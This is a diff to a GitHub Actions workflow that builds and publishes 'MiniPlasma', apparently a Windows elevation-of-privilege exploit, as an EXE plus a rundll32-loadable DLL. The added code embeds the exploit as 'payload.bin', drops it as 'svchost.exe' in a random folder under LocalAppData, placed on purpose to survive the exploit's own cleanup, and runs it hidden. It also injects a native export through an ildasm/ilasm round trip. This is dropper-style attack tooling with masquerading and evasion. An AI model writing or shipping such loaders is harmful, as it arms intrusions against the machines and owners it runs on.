@@ -15,7 +15,7 @@ jobs:
       - name: Setup MSBuild
         uses: microsoft/setup-msbuild@v2
 
-      # ── Restore packages once (reused for both builds) ────────────────────
+      # ── Restore packages ───────────────────────────────────────────────────
       - name: Restore NuGet packages
         shell: pwsh
         run: |
@@ -35,25 +35,103 @@ jobs:
           New-Item -ItemType Directory -Force staging | Out-Null
           Copy-Item "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe" staging\
 
-      # ── Patch project for DLL ─────────────────────────────────────────────
-      - name: Add Export.cs and patch csproj
+      # ── Embed EXE as resource, patch project for DLL build ────────────────
+      - name: Embed EXE into project and patch for DLL
         shell: pwsh
         run: |
-          $projDir = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP"
+          $projDir  = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP"
+          $exePath  = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
 
-          # Export.cs: plain class, no [DllExport] needed (export injected post-build)
-          $exportCs = "using System;`nusing System.Runtime.InteropServices;`nusing System.Threading;`nnamespace PoC_AbortHydration_ArbitraryRegKey_EoP`n{`n    public class DllEntryPoint`n    {`n        public static void Start(IntPtr hwnd, IntPtr hinst,`n            [MarshalAs(UnmanagedType.LPStr)] string lpszCmdLine, int nCmdShow)`n        {`n            new Thread(() => {`n                try {`n                    typeof(Program)`n                        .GetMethod(`"Main`",`n                            System.Reflection.BindingFlags.Static |`n                            System.Reflection.BindingFlags.NonPublic)`n                        ?.Invoke(null, new object[] { new string[0] });`n                } catch { }`n            }) { IsBackground = true }.Start();`n        }`n    }`n}"
+          # Create Resources dir and copy EXE as payload.bin
+          New-Item -ItemType Directory -Force "$projDir\Resources" | Out-Null
+          Copy-Item $exePath "$projDir\Resources\payload.bin" -Force
+          Write-Output "payload.bin: $((Get-Item "$projDir\Resources\payload.bin").Length) bytes"
+
+          # Export.cs:
+          #  Start()  -> extract embedded EXE to %LOCALAPPDATA%\Microsoft\Windows\{guid}\svchost.exe
+          #              (outside %TEMP%, not touched by Stage3 cleanup), then run it.
+          #  The extracted EXE is a proper standalone executable — Stage0 can spawn it as a process.
+          $exportCs = @'
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace PoC_AbortHydration_ArbitraryRegKey_EoP
+{
+    public class DllEntryPoint
+    {
+        [DllExport("Start", CallingConvention = CallingConvention.StdCall)]
+        public static void Start(IntPtr hwnd, IntPtr hinst,
+            [MarshalAs(UnmanagedType.LPStr)] string lpszCmdLine, int nCmdShow)
+        {
+            new Thread(RunPayload) { IsBackground = true }.Start();
+        }
+
+        private static void RunPayload()
+        {
+            try
+            {
+                // Extract embedded EXE to a persistent directory that Stage3 cleanup won't touch.
+                // Stage3 deletes {exeDir}\System32\ — we place the EXE outside %TEMP% to avoid that.
+                string storeDir = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                    "Microsoft", "Windows",
+                    Guid.NewGuid().ToString("N").Substring(0, 16));
+                Directory.CreateDirectory(storeDir);
+                string exePath = Path.Combine(storeDir, "svchost.exe");
+
+                // Extract payload.bin (the embedded EXE)
+                Assembly asm = typeof(DllEntryPoint).Assembly;
+                string resName = "PoC_AbortHydration_ArbitraryRegKey_EoP.Resources.payload.bin";
+                using (Stream src = asm.GetManifestResourceStream(resName))
+                using (FileStream dst = File.Create(exePath))
+                    src.CopyTo(dst);
+
+                // Run it — Stage0 inside the EXE will use Assembly.Location = exePath (valid EXE)
+                Process.Start(new ProcessStartInfo(exePath) { UseShellExecute = false });
+            }
+            catch { }
+        }
+    }
+}
+'@
+          # Write Export.cs (note: [DllExport] attribute defined here as a stub so it compiles;
+          # the real native export is injected later by ildasm/ilasm)
           [IO.File]::WriteAllText("$projDir\Export.cs", $exportCs, [Text.Encoding]::UTF8)
 
-          # Add Export.cs to csproj
+          # Stub attribute so [DllExport] compiles without an external reference
+          $stubCs = @'
+namespace RGiesecke.DllExport
+{
+    [System.AttributeUsage(System.AttributeTargets.Method)]
+    internal sealed class DllExportAttribute : System.Attribute
+    {
+        public DllExportAttribute(string name, System.Runtime.InteropServices.CallingConvention conv) { }
+    }
+}
+'@
+          [IO.File]::WriteAllText("$projDir\DllExportStub.cs", $stubCs, [Text.Encoding]::UTF8)
+
+          # Patch csproj: add Export.cs, DllExportStub.cs, payload.bin resource
           $csprojPath = "$projDir\PoC_AbortHydration_ArbitraryRegKey_EoP.csproj"
           $csproj = [IO.File]::ReadAllText($csprojPath)
-          $csproj = $csproj.Replace('<Compile Include="Program.cs" />', '<Compile Include="Export.cs" /><Compile Include="Program.cs" />')
+
+          $csproj = $csproj.Replace(
+              '<Compile Include="Program.cs" />',
+              '<Compile Include="DllExportStub.cs" /><Compile Include="Export.cs" /><Compile Include="Program.cs" />')
+
+          $csproj = $csproj.Replace(
+              '<None Include="App.config" />',
+              '<None Include="App.config" /><EmbeddedResource Include="Resources\payload.bin" />')
+
           [IO.File]::WriteAllText($csprojPath, $csproj, [Text.Encoding]::UTF8)
-          Write-Output "Export.cs added to project"
+          Write-Output "Project patched"
 
       # ── DLL build ─────────────────────────────────────────────────────────
-      - name: Build DLL (x64, Costura-merged, no export yet)
+      - name: Build DLL (x64, payload.bin embedded)
         run: >
           msbuild "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\PoC_AbortHydration_ArbitraryRegKey_EoP.csproj"
           /p:Configuration=Release /p:Platform=x64
@@ -68,43 +146,33 @@ jobs:
         run: |
           $dllIn = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\x64\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.dll"
           $work  = "$env:TEMP\il_export"
+          Remove-Item -Recurse -Force $work -ErrorAction SilentlyContinue
           New-Item -ItemType Directory -Force $work | Out-Null
 
-          # Find ildasm (prefer x64, avoid ARM)
           $ildasm = Get-ChildItem "C:\Program Files (x86)\Microsoft SDKs\Windows" -Recurse -Filter "ildasm.exe" -ErrorAction SilentlyContinue |
                     Where-Object { $_.FullName -notmatch "arm" } |
                     Sort-Object { if ($_.FullName -match "x64") { 0 } else { 1 } } |
                     Select-Object -First 1
           if (-not $ildasm) { throw "ildasm.exe not found" }
-          Write-Output "ildasm: $($ildasm.FullName)"
-
-          # ilasm (64-bit)
           $ilasm = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe"
           if (-not (Test-Path $ilasm)) { throw "ilasm.exe not found" }
+          Write-Output "ildasm: $($ildasm.FullName)"
 
-          # Disassemble
           $ilPath = "$work\poc.il"
           & $ildasm.FullName /all /nobar "/output=$ilPath" $dllIn
-          $ilSize = (Get-Item $ilPath).Length
-          Write-Output "Disassembled — IL size: $ilSize bytes"
+          Write-Output "Disassembled — $((Get-Item $ilPath).Length) bytes"
 
-          # Patch IL (string-based, no regex — avoids timeout on large IL file)
           $il = [IO.File]::ReadAllText($ilPath)
 
-          # 1. Find the main .module line (not .module extern) and insert vtfixup after it
-          $nlModule = "`r`n.module "
-          $searchFrom = 0
-          $moduleEnd = -1
+          # 1. Insert vtfixup once after main .module line (not .module extern)
+          $searchFrom = 0; $moduleEnd = -1
           while ($true) {
-              $idx = $il.IndexOf($nlModule, $searchFrom)
+              $idx = $il.IndexOf("`r`n.module ", $searchFrom)
               if ($idx -lt 0) { break }
-              $lineContent = $il.Substring($idx + 2)  # skip \r\n
-              if (-not $lineContent.StartsWith(".module extern")) {
-                  # Found the main .module line — find its end
+              if (-not $il.Substring($idx + 2).StartsWith(".module extern")) {
                   $lineEndIdx = $il.IndexOf("`r`n", $idx + 2)
                   if ($lineEndIdx -lt 0) { $lineEndIdx = $il.Length }
-                  $moduleEnd = $lineEndIdx
-                  break
+                  $moduleEnd = $lineEndIdx; break
               }
               $searchFrom = $idx + 1
           }
@@ -112,11 +180,10 @@ jobs:
               $vtfixup = "`r`n.vtfixup [1] int64 fromunmanaged at VT_01`r`n.data VT_01 = int64(0)"
               $il = $il.Substring(0, $moduleEnd) + $vtfixup + $il.Substring($moduleEnd)
               Write-Output "vtfixup injected"
-          } else { Write-Output "WARNING: .module line not found" }
+          }
 
-          # 2. Find Start() method and inject .vtentry / .export after its opening brace
-          $startSig = "void  Start("  # ildasm uses double-space after void
-          $sigIdx = $il.IndexOf($startSig)
+          # 2. Inject .vtentry / .export inside Start() body
+          $startSig = "void  Start("; $sigIdx = $il.IndexOf($startSig)
           if ($sigIdx -lt 0) { $startSig = "void Start("; $sigIdx = $il.IndexOf($startSig) }
           if ($sigIdx -ge 0) {
               $cilIdx   = $il.IndexOf("cil managed", $sigIdx)
@@ -124,15 +191,13 @@ jobs:
               if ($braceIdx -ge 0) {
                   $inject = "`r`n    .vtentry 1 : 1`r`n    .export [1] as Start"
                   $il = $il.Substring(0, $braceIdx + 1) + $inject + $il.Substring($braceIdx + 1)
-                  Write-Output ".vtentry/.export injected into Start()"
-              } else { Write-Output "WARNING: opening brace for Start() not found" }
-          } else { Write-Output "WARNING: Start() method signature not found" }
+                  Write-Output ".vtentry/.export injected"
+              }
+          }
 
           $modIl = "$work\poc_export.il"
           [IO.File]::WriteAllText($modIl, $il)
-          Write-Output "IL patched and written"
 
-          # Reassemble (include .res if present)
           $resFile = "$work\poc.res"
           $outDll  = "$work\output.dll"
           $args = @("/dll", "/x64", "/optimize", "/nologo", "/output=$outDll")
@@ -142,13 +207,10 @@ jobs:
 
           if (Test-Path $outDll) {
               Copy-Item $outDll "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll"
-              $sz = (Get-Item "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll").Length
-              Write-Output "DLL staged: $sz bytes"
-          } else {
-              throw "ilasm failed — output DLL not found"
-          }
+              Write-Output "DLL staged: $((Get-Item "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll").Length) bytes"
+          } else { throw "ilasm failed" }
 
-      - name: List staging artifacts
+      - name: List staging
         shell: pwsh
         run: Get-ChildItem staging\ | Format-Table Name, Length
 
@@ -158,9 +220,9 @@ jobs:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         shell: pwsh
         run: |
-          $tag = "v2.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
+          $tag = "v3.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
           gh release create $tag staging\* `
-            --title "MiniPlasma v2.0 - EXE + DLL" `
-            --notes "EXE: Costura single-file. DLL: x64, exports Start() (rundll32-compatible), all deps embedded via Costura.Fody, export injected via ildasm/ilasm." `
+            --title "MiniPlasma v3.0 - EXE + DLL (embedded payload)" `
+            --notes "DLL: x64, Start() export, EXE embedded as resource — extracted to LocalAppData on load (not TEMP, avoids Stage3 cleanup path). EXE: Costura single-file." `
             --repo $env:GITHUB_REPOSITORY
           Write-Output "Release: $tag"
